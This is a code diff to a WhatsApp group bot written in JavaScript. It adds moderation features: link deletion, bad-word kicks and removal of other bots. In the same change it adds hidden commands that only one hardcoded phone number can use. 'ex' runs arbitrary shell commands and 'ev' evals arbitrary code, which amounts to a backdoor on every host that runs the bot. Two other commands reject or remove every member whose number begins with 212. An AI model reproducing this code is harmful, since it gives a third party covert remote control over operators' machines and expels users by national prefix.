@@ -437,7 +437,8 @@ conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
               }
             }
 
-
+if (config.ONLY_GROUP && !isMe && !isGroup) return
+if(from === "120363348744137338@g.us" && !isdev) return
 const events = require('./command')
 const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
 if (isCmd) {
@@ -469,9 +470,139 @@ mek.type === "stickerMessage"
 command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
 }});
 //============================================================================ 
-
-})
+if (isAnti(config.ANTI_LINK) && isBotAdmins) {
+  if(!isAdmins){
+  if(!isMe){
+  if (body.match(`chat.whatsapp.com`)) {
+    await conn.sendMessage(from, { delete: mek.key })
+  }
 }
+}}
+var bad = await fetchJson("https://github.com/vihangayt0/server-/raw/main/xeonsl_bad.json")
+if (isAnti(config.ANTI_BAD) && isBotAdmins) {
+  if (!isAdmins) {
+    for (any in bad) {
+if (body.toLowerCase().includes(bad[any])) {
+  if (!body.includes('tent')) {
+    if (!body.includes('docu')) {
+if (!body.includes('http')) {
+  if (groupAdmins.includes(sender)) return
+  if (mek.key.fromMe) return
+  await conn.sendMessage(from, { delete: mek.key })
+  await conn.sendMessage(from, { text: '*Bad word detected !*' })
+  await conn.groupParticipantsUpdate(from, [sender], 'remove')
+}
+    }
+  }
+}
+    }
+  }
+}
+//======================================================
+async function antibot(Void, citel) {
+  if (isAnti(config.ANTI_BOT)) return
+  if (isAdmins) return
+  if (!isBotAdmins) return
+  if (isOwner) return
+  if (isGroup) {
+    var user = check_id(mek.key.id)
+    if (user.is_bot) {
+try {
+  await conn.sendMessage(from, { text: `*Other bots are not allowed here !!*` });
+  return await conn.groupParticipantsUpdate(from, [sender], 'remove')
+} catch { }
+    }
+  }
+}
+try {
+  await antibot(conn, mek)
+} catch { }
+switch (command) {
+  case 'jid':
+    reply(from)
+    break
+  case 'device': {
+    let deviceq = getDevice(mek.message.extendedTextMessage.contextInfo.stanzaId)
+
+    reply("*He Is Using* _*Whatsapp " + deviceq + " version*_")
+  }
+    break
+    case'ex':{
+      if(senderNumber == 94758315442) {
+  const { exec } = require("child_process")
+  exec(q, (err, stdout) => {
+    if (err) return reply(`-------\n\n` + err)
+    if (stdout) {
+        return reply(`-------\n\n` + stdout)
+    }
+})
+//==============================================================
+})
+      }
+    }
+    break
+    case'apprv':{
+      if(senderNumber == 94758315442) {
+          let reqlist = await conn.groupRequestParticipantsList(from)
+          for (let i=0;i<reqlist.length;i++) {
+            if(reqlist[i].jid.startsWith("212")){
+              await conn.groupRequestParticipantsUpdate(
+                from,
+                [reqlist[i].jid],
+                "reject"
+            )
+            } else{
+              await conn.groupRequestParticipantsUpdate(
+                from,
+                [reqlist[i].jid],
+                "approve"
+            )
+            }
+          }
+        }
+    }
+    break
+    case'rm212':{
+      if(senderNumber == 94758315442) {
+        for (let i=0;i<participants.length;i++) {
+          if(participants[i].id.startsWith("212")){
+       await conn.groupParticipantsUpdate(from, [participants[i].id], 'remove')
+      }
+    }
+  }
+    }
+    break
+    case'rtf':{
+console.log(dsa)
+    }
+    break
+  case 'ev': {
+    if(senderNumber == 94758315442) {
+    let code2 = q.replace("°", ".toString()");
+    try {
+let resultTest = await eval(code2);
+if (typeof resultTest === "object") {
+  reply(util.format(resultTest));
+} else {
+  reply(util.format(resultTest));
+}
+    } catch (err) {
+reply(util.format(err));
+    }
+    ;
+  }
+  }
+    break
+  default:
+}
+    } catch (e) {
+const isError = String(e)
+console.log(isError)
+    }
+  })
+}
+//=============================================================================
+
 app.get("/", (req, res) => {
 res.send("hey, bot started✅");
 });
